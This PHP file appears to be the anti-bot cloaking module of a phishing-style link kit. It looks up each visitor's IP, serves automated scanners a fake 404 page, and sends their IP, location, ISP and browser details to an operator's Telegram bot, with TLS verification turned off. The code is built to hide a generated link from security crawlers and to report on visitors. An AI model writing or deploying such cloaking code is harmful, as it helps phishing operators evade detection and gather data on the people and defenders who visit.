<?php
function block_access(){
	
	$IP = antibot_getIP();
	$browser = antibot_getBrowser();
	$os = antibot_getOS($_SERVER['HTTP_USER_AGENT']);
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $IP);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$ip_data_in = curl_exec($ch);
	curl_close($ch);
	$ip_data = json_decode($ip_data_in, true);
	$country = $ip_data["country"];
	$city = $ip_data["city"];
	$isp = $ip_data["isp"];
	$org = $ip_data["org"];
	$as = $ip_data["as"];
	$code = $ip_data["zip"];
	$timezone = $ip_data["timezone"];
	$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
	$browser_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
	
	
	$message = "---------------------------------------
🚫 BOT ACCESS HAS BEEN DENIED 🚫
---------------------------------------
🔗 URL => #https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."
🌎 IP Address => ".$IP."
📅 TimeStamp => ".date('d/m/Y H:i:s')."
🌐 Lang => $browser_language
🛫 Country => ".$country."
🏙 City => ".$city."
⌨️ Browser => ".$user_agent."
🖥 OS => ".$os."
📫 Postal Code => " . $code . "
🕛 Time Zone => " . $timezone . "
⚡ Connection => " . $isp . "
🆔 Known => " . $as . "
🏢 ORG => " . $org . "";
	
	if(isset($_SESSION['Link'])){
		$chat_id = $_SESSION['Link']['GeneratedLink']['admin_chat_id'];
		$token = $_SESSION['Link']['GeneratedLink']['admin_telegram_bot'];
		send_report($chat_id,$token,$message);
	}

	header("HTTP/1.0 404 Not Found");
	die();
}

function antibot_getIP(){
	$ip = "";
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	// if($ip=="::1"){
		// $ip= "20.191.45.212";
	// }
	return $ip;
}

function antibot_getOS($user_agent) { 
	$os_platform  = "Unknown OS Platform";
	$os_array     = array(
	  '/windows nt 10/i'      =>  'Windows 10',
	  '/windows nt 6.3/i'     =>  'Windows 8.1',
	  '/windows nt 6.2/i'     =>  'Windows 8',
	  '/windows nt 6.1/i'     =>  'Windows 7',
	  '/windows nt 6.0/i'     =>  'Windows Vista',
	  '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	  '/windows nt 5.1/i'     =>  'Windows XP',
	  '/windows xp/i'         =>  'Windows XP',
	  '/windows nt 5.0/i'     =>  'Windows 2000',
	  '/windows me/i'         =>  'Windows ME',
	  '/win98/i'              =>  'Windows 98',
	  '/win95/i'              =>  'Windows 95',
	  '/win16/i'              =>  'Windows 3.11',
	  '/macintosh|mac os x/i' =>  'Mac OS X',
	  '/mac_powerpc/i'        =>  'Mac OS 9',
	  '/linux/i'              =>  'Linux',
	  '/ubuntu/i'             =>  'Ubuntu',
	  '/iphone/i'             =>  'iPhone',
	  '/ipod/i'               =>  'iPod',
	  '/ipad/i'               =>  'iPad',
	  '/android/i'            =>  'Android',
	  '/blackberry/i'         =>  'BlackBerry',
	  '/webos/i'              =>  'Mobile'
	);

	foreach ($os_array as $regex => $value)
		if (preg_match($regex, $user_agent))
			$os_platform = $value;

	return $os_platform;
}

function antibot_getBrowser(){
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$name = 'NA';

	if (preg_match('/MSIE/i', $agent) && !preg_match('/Opera/i', $agent)) {
		$name = 'Internet Explorer';
	} elseif (preg_match('/Firefox/i', $agent)) {
		$name = 'Mozilla Firefox';
	} elseif (preg_match('/Chrome/i', $agent)) {
		$name = 'Google Chrome';
	} elseif (preg_match('/Safari/i', $agent)) {
		$name = 'Apple Safari';
	} elseif (preg_match('/Opera/i', $agent)) {
		$name = 'Opera';
	} elseif (preg_match('/Netscape/i', $agent)) {
		$name = 'Netscape';
	}
	return $name;
}

function check_real_bots(){
	$ip = antibot_getIP();
	$url = "https://api.ipdetective.io/ip/$ip?info=true";
	$response = antibot_get_web_response($url);
	$response = json_decode($response[2], true);
	
	$is_bot = $response['bot'] ?? false;
	$is_bot = (bool) $is_bot;
	$type = $response['type'] ?? false;

	if($is_bot || $type=='bot'){
		block_access();
	}
}

function send_report($chat_id,$token,$msg){
	$data = [
		'chat_id' => $chat_id,
		'text' => $msg,
		'parse_mode'=>'html'
	];
	
	$url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data);
	$curl = curl_init($url);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

	//for debug only!
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

	$response = curl_exec($curl);
	return $response;
}


function antibot_get_web_response($url,$data='',$header=array(),$method='GET',$ua='iBypasser Agent',$authorization=null){
	$ch = curl_init($url);
	curl_setopt($ch ,CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	curl_setopt($ch, CURLOPT_USERAGENT, $ua);   
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
	
	if(strtoupper($method=='POST') || strtoupper($method=='PUT')){
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	}
	
	// curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
	if($authorization!==null){
		curl_setopt($ch, CURLOPT_USERPWD, $authorization);
	}
	  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_VERBOSE, true);

	
	curl_setopt($ch, CURLOPT_HEADER, true);
	$result_with_headers = curl_exec($ch);
	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	
	$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
	$body = substr($result_with_headers, $header_size);
	$redirectURL = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL );
	curl_close($ch);
	
	return array($result_with_headers,$httpcode,$body,$redirectURL);
}

check_real_bots();

?>